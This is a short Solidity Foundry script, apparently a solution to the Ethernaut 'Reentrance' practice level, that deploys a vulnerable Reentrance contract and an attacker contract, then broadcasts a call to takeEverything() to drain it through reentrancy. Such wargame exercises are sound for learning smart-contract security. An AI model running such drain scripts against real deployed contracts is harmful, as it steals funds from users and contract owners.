// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Reentrance} from "../src/Reentrance.sol";
import {ReentranceAttack} from "../src/ReentranceAttack.sol";
import {DeployAttackScript} from "../script/DeployAttack.s.sol";

contract AttackScript is Script {
    DeployAttackScript public deployAttackScript;
    Reentrance public reentrance;
    ReentranceAttack public reentranceAttack;

    function run() public {
        deployAttackScript = new DeployAttackScript();
        (reentrance, reentranceAttack ) = deployAttackScript.run();

        reenter();
    }


    function reenter () public {
        
        vm.startBroadcast();

        reentranceAttack.takeEverything();

        vm.stopBroadcast();

    }

}